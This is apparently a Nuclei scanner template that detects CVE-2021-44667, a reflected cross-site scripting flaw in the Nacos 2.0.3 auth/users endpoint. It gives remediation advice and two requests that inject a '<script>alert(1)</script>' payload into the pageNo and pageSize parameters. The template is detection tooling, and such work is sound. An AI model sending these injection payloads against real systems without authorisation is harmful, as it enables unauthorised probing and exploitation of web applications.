id: CVE-2021-44667

info:
  name: Nacos 2.0.3 XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A Cross Site Scripting (XSS) vulnerability exists in Nacos 2.0.3 in auth/users via the pageSize and pageNo parameters.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and potential compromise of the Nacos application.
  remediation: |
    Upgrade Nacos to version 2.0.4 or later to mitigate the XSS vulnerability.
  reference:
    - https://github.com/alibaba/nacos/issues/7359

http:
  - method: GET
    path:
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=<script>alert(1)</script>"
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=<script>alert(1)</script>&pageSize=1"

    matchers:
      - type: word
        words:
          - "<script>alert(1)</script>"
        part: body
